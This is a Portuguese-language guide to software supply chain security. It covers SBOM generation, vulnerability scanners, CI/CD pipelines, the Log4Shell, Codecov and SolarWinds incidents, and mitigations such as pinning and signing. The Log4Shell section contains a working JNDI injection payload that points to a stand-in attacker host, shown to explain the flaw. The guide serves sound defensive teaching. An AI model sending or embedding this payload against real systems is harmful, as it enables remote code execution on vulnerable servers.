# 🔒 Supply Chain Security - Especializações Avançadas

## Índice

1. [Introdução](#1-introdução)
2. [SBOM (Software Bill of Materials)](#2-sbom-software-bill-of-materials)
3. [Vulnerability Scanning](#3-vulnerability-scanning)
4. [Ferramentas Open Source](#4-ferramentas-open-source)
5. [CI/CD Integration](#5-cicd-integration)
6. [Casos de Ataque Reais](#6-casos-de-ataque-reais)
7. [Estratégias de Mitigação](#7-estratégias-de-mitigação)
8. [Compliance e Frameworks](#8-compliance-e-frameworks)

---

## 1. Introdução

### O que é Supply Chain Security?

**Definição:** Garantir que dependências (bibliotecas, frameworks, imagens Docker) não introduzam vulnerabilidades ou código malicioso.

**Por que importa:**

```
Aplicação Moderna = 10% código próprio + 90% dependências
```

**Estatísticas Alarmantes:**

- 🚨 **84%** das aplicações Java têm pelo menos 1 CVE crítico (Sonatype, 2023)
- 🚨 **60%** das breaches envolvem supply chain (ENISA, 2023)
- 🚨 **Log4Shell** afetou 93% das aplicações enterprise

### Vetores de Ataque

**1. Dependências Vulneráveis**

```
app → library-1.0.0 (CVE-2023-12345)
```

**2. Dependency Confusion**

```
Atacante cria pacote "internal-lib" no NPM público
Sistema baixa versão maliciosa em vez da interna
```

**3. Typosquatting**

```
Pacote legítimo: "requests"
Pacote malicioso: "request" (falta 's')
```

**4. Compromised Maintainer**

```
Mantenedor de pacote popular é hackeado
Atacante publica versão com backdoor
```

---

## 2. SBOM (Software Bill of Materials)

### 2.1 O que é SBOM?

**Definição:** Lista completa de componentes de software (como lista de ingredientes em alimento).

**Padrões:**

- **SPDX** (Software Package Data Exchange) - Linux Foundation
- **CycloneDX** - OWASP

**Exemplo SBOM (CycloneDX JSON):**

```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "serialNumber": "urn:uuid:3e671687-395b-41f5-a30f-a58921a69b79",
  "version": 1,
  "metadata": {
    "timestamp": "2025-01-15T10:00:00Z",
    "component": {
      "type": "application",
      "name": "order-service",
      "version": "2.1.0"
    }
  },
  "components": [
    {
      "type": "library",
      "name": "spring-boot-starter-web",
      "version": "3.2.0",
      "purl": "pkg:maven/org.springframework.boot/spring-boot-starter-web@3.2.0",
      "hashes": [
        {
          "alg": "SHA-256",
          "content": "d2b2e5f..."
        }
      ]
    },
    {
      "type": "library",
      "name": "log4j-core",
      "version": "2.17.1",
      "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.17.1",
      "hashes": [
        {
          "alg": "SHA-256",
          "content": "a1b2c3d..."
        }
      ],
      "properties": [
        {
          "name": "aquasecurity:trivy:VulnerabilityID",
          "value": "CVE-2021-44228"
        }
      ]
    }
  ],
  "dependencies": [
    {
      "ref": "pkg:maven/org.springframework.boot/spring-boot-starter-web@3.2.0",
      "dependsOn": ["pkg:maven/org.apache.logging.log4j/log4j-core@2.17.1"]
    }
  ]
}
```

### 2.2 Gerando SBOM

**Maven (CycloneDX Plugin):**

```xml
<plugin>
    <groupId>org.cyclonedx</groupId>
    <artifactId>cyclonedx-maven-plugin</artifactId>
    <version>2.7.9</version>
    <executions>
        <execution>
            <phase>package</phase>
            <goals>
                <goal>makeAggregateBom</goal>
            </goals>
        </execution>
    </executions>
    <configuration>
        <outputFormat>json</outputFormat>
        <outputName>sbom</outputName>
    </configuration>
</plugin>
```

```bash
mvn cyclonedx:makeAggregateBom
# Gera target/sbom.json
```

**NPM (CycloneDX CLI):**

```bash
npm install -g @cyclonedx/cyclonedx-npm
cyclonedx-npm --output-file sbom.json
```

**Python (pip-audit):**

```bash
pip install pip-audit
pip-audit --format cyclonedx-json --output sbom.json
```

**Docker (Syft):**

```bash
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh
syft nginx:latest -o cyclonedx-json > sbom.json
```

---

## 3. Vulnerability Scanning

### 3.1 Tipos de Vulnerabilidades

**CVE (Common Vulnerabilities and Exposures):**

```
CVE-2021-44228 (Log4Shell)
├─ CVSS Score: 10.0 (CRITICAL)
├─ Affected: log4j-core 2.0-beta9 to 2.14.1
├─ Attack Vector: Remote Code Execution
└─ Fix: Atualizar para 2.17.1+
```

**CWE (Common Weakness Enumeration):**

```
CWE-502: Deserialization of Untrusted Data
CWE-89: SQL Injection
CWE-79: Cross-site Scripting (XSS)
```

**CVSS (Common Vulnerability Scoring System):**

```
Score 0.0-3.9   = LOW
Score 4.0-6.9   = MEDIUM
Score 7.0-8.9   = HIGH
Score 9.0-10.0  = CRITICAL
```

### 3.2 Priorização de Vulnerabilidades

**Framework: EPSS (Exploit Prediction Scoring System)**

```
CVE-2023-12345
├─ CVSS: 7.5 (HIGH)
├─ EPSS: 89% probabilidade de exploit em 30 dias
└─ Prioridade: 🔥 URGENTE
```

**Contexto:**
| CVE | CVSS | EPSS | Exploited in Wild? | Reachable? | Ação |
|-----|------|------|--------------------|------------|------|
| CVE-A | 9.0 | 5% | Não | Não | 🟡 Médio prazo |
| CVE-B | 7.5 | 89% | Sim | Sim | 🔴 URGENTE |
| CVE-C | 10.0 | 1% | Não | Não | 🟢 Monitorar |

---

## 4. Ferramentas Open Source

### 4.1 Trivy (Aqua Security)

**O que é:** Scanner de vulnerabilidades all-in-one (containers, código, config).

**Instalação:**

```bash
# Linux
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt update && sudo apt install trivy

# macOS
brew install trivy

# Docker
docker run aquasec/trivy
```

**Uso:**

```bash
# Escanear imagem Docker
trivy image nginx:latest

# Escanear filesystem (projeto Java/Node/Python)
trivy fs /path/to/project

# Escanear arquivo SBOM
trivy sbom sbom.json

# Escanear repositório Git
trivy repo https://github.com/user/repo

# Output formatado
trivy image nginx:latest --format json > report.json
trivy image nginx:latest --format sarif > report.sarif
```

**Exemplo de Output:**

```
nginx:latest (debian 12.4)

Total: 87 (UNKNOWN: 0, LOW: 52, MEDIUM: 24, HIGH: 9, CRITICAL: 2)

┌───────────────┬────────────────┬──────────┬───────────────────┬───────────────┬─────────────────────────────────┐
│    Library    │ Vulnerability  │ Severity │ Installed Version │ Fixed Version │             Title               │
├───────────────┼────────────────┼──────────┼───────────────────┼───────────────┼─────────────────────────────────┤
│ libssl3       │ CVE-2023-5678  │ CRITICAL │ 3.0.11-1          │ 3.0.13-1      │ OpenSSL: Buffer Overflow        │
│ curl          │ CVE-2023-9999  │ HIGH     │ 7.88.1-10         │ 7.88.1-11     │ curl: Use-after-free in HTTP2   │
└───────────────┴────────────────┴──────────┴───────────────────┴───────────────┴─────────────────────────────────┘
```

**Configuração (trivy.yaml):**

```yaml
# .trivy.yaml
severity:
  - CRITICAL
  - HIGH

exit-code: 1 # Falhar CI se vulnerabilidades encontradas

ignore-unfixed: false # Não ignorar vulnerabilidades sem fix

ignorefile: .trivyignore

output: table
```

**.trivyignore (suprimir falsos positivos):**

```
# CVE-2023-1234 não aplicável (usamos feature X desabilitada)
CVE-2023-1234

# CVE-2023-5678 fix indisponível, workaround aplicado
CVE-2023-5678
```

---

### 4.2 Snyk (Versão Open Source)

**O que é:** Scanner de vulnerabilidades com foco em developer experience.

**Instalação:**

```bash
npm install -g snyk
snyk auth  # Login gratuito
```

**Uso:**

```bash
# Escanear projeto
snyk test

# Escanear com detalhes
snyk test --severity-threshold=high --json

# Escanear imagem Docker
snyk container test nginx:latest

# Escanear código (SAST)
snyk code test

# Fix automático (quando disponível)
snyk fix
```

**Exemplo de Output:**

```
Testing /project...

✗ High severity vulnerability found in lodash
  Description: Prototype Pollution
  Info: https://snyk.io/vuln/SNYK-JS-LODASH-590103
  From: lodash@4.17.15
  Fixed in: 4.17.21

  Upgrade lodash@4.17.15 to lodash@4.17.21 to fix

Organization: free-tier
Tested 423 dependencies for known issues, found 12 issues.
```

**snyk.policy (ignorar vulnerabilidades):**

```yaml
# .snyk
version: v1.22.0
ignore:
  SNYK-JS-LODASH-590103:
    - "*":
        reason: Not reachable in our codebase
        expires: 2025-12-31T00:00:00.000Z
```

---

### 4.3 OWASP Dependency-Check

**O que é:** Scanner focado em CVEs para dependências (Java, .NET, Python, Ruby, Node.js).

**Instalação:**

```bash
# CLI
wget https://github.com/jeremylong/DependencyCheck/releases/download/v9.0.0/dependency-check-9.0.0-release.zip
unzip dependency-check-9.0.0-release.zip
```

**Maven Plugin:**

```xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.0</version>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>  <!-- Falhar se CVSS >= 7 -->
        <suppressionFile>dependency-check-suppressions.xml</suppressionFile>
    </configuration>
</plugin>
```

```bash
mvn dependency-check:check
```

**Supressões (dependency-check-suppressions.xml):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<suppressions xmlns="https://jeremylong.github.io/DependencyCheck/dependency-suppression.1.3.xsd">
    <suppress>
        <notes>CVE is for a different component with same name</notes>
        <cve>CVE-2023-12345</cve>
    </suppress>

    <suppress>
        <notes>Vulnerability does not affect our usage</notes>
        <gav regex="true">^org\.apache\.commons:commons-text:.*$</gav>
        <cve>CVE-2022-42889</cve>
    </suppress>
</suppressions>
```

---

### 4.4 Grype (Anchore)

**O que é:** Scanner de vulnerabilidades rápido e leve.

**Instalação:**

```bash
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh
```

**Uso:**

```bash
# Escanear imagem Docker
grype nginx:latest

# Escanear diretório
grype dir:/path/to/project

# Escanear SBOM
grype sbom:./sbom.json

# Output JSON
grype nginx:latest -o json > vulnerabilities.json
```

**Configuração (.grype.yaml):**

```yaml
# .grype.yaml
fail-on-severity: high

ignore:
  - vulnerability: CVE-2023-1234
    fix-state: wont-fix

output: table
```

---

### 4.5 OSV-Scanner (Google)

**O que é:** Scanner que usa OSV (Open Source Vulnerabilities) database.

**Instalação:**

```bash
go install github.com/google/osv-scanner/cmd/osv-scanner@v1
```

**Uso:**

```bash
# Escanear lockfiles automaticamente
osv-scanner --lockfile=package-lock.json
osv-scanner --lockfile=Gemfile.lock

# Escanear diretório inteiro
osv-scanner --recursive /path/to/project

# Escanear SBOM
osv-scanner --sbom=sbom.json
```

---

## 5. CI/CD Integration

### 5.1 GitHub Actions

**Workflow Completo:**

```yaml
name: Security Scanning

on:
  push:
    branches: [main, develop]
  pull_request:
  schedule:
    - cron: "0 8 * * *" # Daily 8am

jobs:
  sbom-generation:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Generate SBOM (CycloneDX)
        uses: CycloneDX/gh-maven-sbom-action@v1
        with:
          output: sbom.json

      - name: Upload SBOM
        uses: actions/upload-artifact@v3
        with:
          name: sbom
          path: sbom.json

  vulnerability-scan-trivy:
    runs-on: ubuntu-latest
    needs: sbom-generation
    steps:
      - uses: actions/checkout@v3

      - name: Download SBOM
        uses: actions/download-artifact@v3
        with:
          name: sbom

      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: "sbom"
          input: sbom.json
          format: "sarif"
          output: "trivy-results.sarif"
          severity: "CRITICAL,HIGH"

      - name: Upload Trivy results to GitHub Security
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: "trivy-results.sarif"

      - name: Fail build on CRITICAL
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: "sbom"
          input: sbom.json
          exit-code: "1"
          severity: "CRITICAL"

  vulnerability-scan-snyk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

      - name: Upload Snyk results
        uses: github/codeql-action/upload-sarif@v2
        if: always()
        with:
          sarif_file: snyk.sarif

  docker-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Scan with Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: "myapp:${{ github.sha }}"
          format: "table"
          exit-code: "1"
          severity: "CRITICAL,HIGH"

      - name: Scan with Grype
        uses: anchore/scan-action@v3
        with:
          image: "myapp:${{ github.sha }}"
          fail-build: true
          severity-cutoff: high

  dependency-review:
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    steps:
      - uses: actions/checkout@v3

      - name: Dependency Review
        uses: actions/dependency-review-action@v3
        with:
          fail-on-severity: high
          deny-licenses: GPL-3.0, AGPL-3.0 # Bloquear licenças problemáticas
```

### 5.2 GitLab CI

**.gitlab-ci.yml:**

```yaml
stages:
  - sbom
  - security
  - report

sbom:generate:
  stage: sbom
  image: maven:3.9-eclipse-temurin-17
  script:
    - mvn cyclonedx:makeAggregateBom
  artifacts:
    paths:
      - target/sbom.json
    expire_in: 1 week

trivy:scan:
  stage: security
  image: aquasec/trivy:latest
  dependencies:
    - sbom:generate
  script:
    - trivy sbom target/sbom.json --exit-code 1 --severity CRITICAL,HIGH --format json -o trivy-report.json
  artifacts:
    reports:
      container_scanning: trivy-report.json
  allow_failure: false

snyk:scan:
  stage: security
  image: snyk/snyk:node
  script:
    - snyk auth $SNYK_TOKEN
    - snyk test --severity-threshold=high --json > snyk-report.json
  artifacts:
    reports:
      dependency_scanning: snyk-report.json
  allow_failure: true

dependency_check:
  stage: security
  image: owasp/dependency-check:latest
  script:
    - /usr/share/dependency-check/bin/dependency-check.sh
      --project "MyApp"
      --scan .
      --format JSON
      --out dependency-check-report.json
      --failOnCVSS 7
  artifacts:
    paths:
      - dependency-check-report.json

security:report:
  stage: report
  image: python:3.11
  script:
    - pip install jinja2
    - python generate_security_report.py
  artifacts:
    paths:
      - security-report.html
    expose_as: "Security Report"
  when: always
```

---

## 6. Casos de Ataque Reais

### 6.1 Log4Shell (CVE-2021-44228)

**Timeline:**

```
2021-11-24: Vulnerabilidade descoberta
2021-12-09: CVE publicado, exploit in the wild
2021-12-10: Chaos total - 93% das apps afetadas
2021-12-13: Apache libera log4j 2.17.0 (fix completo)
```

**Exploit:**

```java
// Código vulnerável
logger.info("User {} logged in", user.getName());

// Atacante envia:
user.setName("${jndi:ldap://evil.com/malicious}");

// log4j faz lookup automático → RCE
```

**Mitigação:**

```xml
<!-- Atualizar URGENTE -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version> <!-- Ou superior -->
</dependency>
```

**Lições:**

- ✅ SBOM teria identificado dependência vulnerável
- ✅ Vulnerability scanning diário teria alertado
- ✅ Runtime protection (WAF) bloqueou alguns exploits

---

### 6.2 Codecov Supply Chain Attack (2021)

**O que aconteceu:**

```
1. Atacante comprometeu script do Codecov
2. Script modificado roubava secrets do CI/CD
3. Afetou 29,000 organizações (incluindo HashiCorp, Twilio)
```

**Timeline:**

```
2021-01-31: Script comprometido
2021-04-01: Descoberta da breach (3 meses depois!)
2021-04-15: Divulgação pública
```

**Mitigação:**

```yaml
# GitHub Actions - Pin SHA específico
- name: Upload coverage
  uses: codecov/codecov-action@eaaf4bedf32dbdc6b720b63067d99c4d77d6047d # v3.1.4 (SHA fixo)
```

**Lições:**

- ✅ Pin de versões exatas (SHA, não tags)
- ✅ Revisar código de third-party scripts
- ✅ Principle of Least Privilege (não dar secrets desnecessários)

---

### 6.3 SolarWinds Orion (2020)

**O que aconteceu:**

```
1. Atacante comprometeu build pipeline da SolarWinds
2. Trojan inserido no update do Orion
3. 18,000 organizações infectadas (incluindo gov. US)
```

**Mitigação:**

```yaml
# Assinar artefatos de build
- name: Sign artifact
  run: |
    cosign sign --key cosign.key myapp:v1.0.0

# Verificar assinatura antes de deploy
- name: Verify signature
  run: |
    cosign verify --key cosign.pub myapp:v1.0.0
```

**Lições:**

- ✅ Build reproducível
- ✅ Assinatura digital de artefatos
- ✅ Auditoria completa do pipeline

---

## 7. Estratégias de Mitigação

### 7.1 Dependency Pinning

**❌ Evitar versões flutuantes:**

```json
// package.json (NPM)
{
  "dependencies": {
    "express": "^4.18.0" // ❌ Permite 4.x.x (vulnerável a updates maliciosos)
  }
}
```

**✅ Pin exato com lockfile:**

```json
{
  "dependencies": {
    "express": "4.18.2" // ✅ Versão exata
  }
}
```

```bash
# Gerar lockfile
npm install --package-lock-only

# Commit package-lock.json
git add package-lock.json
git commit -m "Lock dependencies"
```

**Maven:**

```xml
<!-- ❌ Range -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter</artifactId>
    <version>[3.0,3.1)</version>  <!-- ❌ Range perigoso -->
</dependency>

<!-- ✅ Versão fixa -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter</artifactId>
    <version>3.2.1</version>  <!-- ✅ Exato -->
</dependency>
```

---

### 7.2 Private Registry (Mirror)

**Problema:** Dependency Confusion

```
Atacante publica "internal-lib" no NPM público (versão 999.0.0)
npm install baixa versão pública em vez da interna
```

**Solução: Private registry com allowlist**

**Artifactory/Nexus:**

```xml
<!-- settings.xml -->
<mirrors>
    <mirror>
        <id>company-mirror</id>
        <url>https://nexus.company.com/repository/maven-public/</url>
        <mirrorOf>*</mirrorOf>  <!-- Bloqueia Maven Central direto -->
    </mirror>
</mirrors>
```

**NPM (.npmrc):**

```
registry=https://nexus.company.com/repository/npm-public/
always-auth=true
```

---

### 7.3 Renovate Bot / Dependabot

**Automatizar updates:**

**Renovate (renovate.json):**

```json
{
  "extends": ["config:base"],
  "schedule": ["before 9am on Monday"],
  "packageRules": [
    {
      "matchUpdateTypes": ["minor", "patch"],
      "automerge": true
    },
    {
      "matchUpdateTypes": ["major"],
      "automerge": false,
      "labels": ["breaking-change"]
    },
    {
      "matchPackagePatterns": ["^log4j"],
      "schedule": ["at any time"], // Updates críticos imediatos
      "automerge": true
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "automerge": true
  }
}
```

**GitHub Dependabot (.github/dependabot.yml):**

```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10

  - package-ecosystem: "maven"
    directory: "/"
    schedule:
      interval: "weekly"
    allow:
      - dependency-type: "direct" # Apenas deps diretas

  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
```

---

### 7.4 Reachability Analysis

**Problema:** Nem toda vulnerabilidade é exploitável

**Exemplo:**

```java
// CVE-2023-12345 afeta método vulnerable() da biblioteca
// Mas nosso código nunca chama esse método!

import com.library.VulnerableClass;

public class MyService {
    public void safeMethod() {
        // Usamos apenas métodos seguros
        VulnerableClass.safeMethod();

        // NUNCA chamamos:
        // VulnerableClass.vulnerableMethod()  // CVE-2023-12345
    }
}
```

**Ferramentas:**

- **JFrog Xray** - Reachability analysis para Java
- **Snyk** - Contextual analysis
- **Semgrep Supply Chain** - Reachability via SAST

---

## 8. Compliance e Frameworks

### 8.1 SLSA (Supply-chain Levels for Software Artifacts)

**O que é:** Framework do Google para avaliar maturidade de supply chain.

**Níveis:**

```
SLSA 0: Sem garantias
SLSA 1: Build script automatizado
SLSA 2: Build assinado, provenance atestado
SLSA 3: Build em ambiente isolado
SLSA 4: Build reproducível + two-party review
```

**Exemplo SLSA 3:**

```yaml
# GitHub Actions com SLSA
name: SLSA Build

on: push

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      id-token: write # OIDC para assinar
      contents: read

    steps:
      - uses: actions/checkout@v3

      - name: Build
        run: mvn package

      - name: Generate provenance
        uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1
        with:
          artifacts: target/*.jar

      - name: Upload provenance
        uses: actions/upload-artifact@v3
        with:
          name: provenance
          path: provenance.json
```

---

### 8.2 NIST SSDF (Secure Software Development Framework)

**Práticas Recomendadas:**

1. **PO.3** - Identificar e documentar dependências (SBOM)
2. **PO.5** - Implementar controles de supply chain
3. **PS.1** - Proteger código de modificação não autorizada
4. **PS.2** - Revisar código e dependências
5. **PW.4** - Remediar vulnerabilidades conhecidas

---

### 8.3 CIS Controls

**Control 2: Inventory and Control of Software Assets**

- Manter SBOM atualizado
- Escanear vulnerabilidades mensalmente

**Control 7: Continuous Vulnerability Management**

- Scanner automático em CI/CD
- Patch management (SLA: CRITICAL = 7 dias)

---

## 📊 Checklist de Implementação

### Fase 1: Visibilidade (1 mês)

- [ ] Gerar SBOM para todas aplicações
- [ ] Implementar Trivy ou Grype no CI/CD
- [ ] Configurar alertas de vulnerabilidades
- [ ] Criar dashboard de vulnerabilidades

### Fase 2: Prevenção (2-3 meses)

- [ ] Dependency pinning (lockfiles)
- [ ] Renovate/Dependabot configurado
- [ ] Private registry com mirror
- [ ] Policy de aprovação de novas deps

### Fase 3: Resposta (ongoing)

- [ ] Runbook para CVE crítico
- [ ] SLA de patch (CRITICAL = 7 dias, HIGH = 30 dias)
- [ ] Reachability analysis para priorização
- [ ] Security Champions treinados

### Fase 4: Maturidade (6+ meses)

- [ ] SLSA Level 3
- [ ] Build reproducível
- [ ] Assinatura digital de artefatos
- [ ] Audit trail completo

---

## 📚 Recursos

### Ferramentas

- **Trivy**: https://github.com/aquasecurity/trivy
- **Grype**: https://github.com/anchore/grype
- **Snyk**: https://snyk.io
- **OWASP Dependency-Check**: https://owasp.org/www-project-dependency-check/
- **OSV-Scanner**: https://github.com/google/osv-scanner

### Databases

- **NVD** (National Vulnerability Database): https://nvd.nist.gov/
- **OSV** (Open Source Vulnerabilities): https://osv.dev/
- **GitHub Advisory Database**: https://github.com/advisories

### Standards

- **CycloneDX**: https://cyclonedx.org/
- **SPDX**: https://spdx.dev/
- **SLSA**: https://slsa.dev/
- **NIST SSDF**: https://csrc.nist.gov/Projects/ssdf

### Compliance

- **SBOM at a Glance**: https://www.cisa.gov/sbom
- **EU Cyber Resilience Act**: https://digital-strategy.ec.europa.eu/en/library/cyber-resilience-act

---

**Próximos passos:**

- Ler [Trace-Based Testing](trace-based-testing.md)
- Ver [Segurança Contínua](seguranca-continua.md)
- Consultar [Glossário](../12-taxonomia/glossario.md)
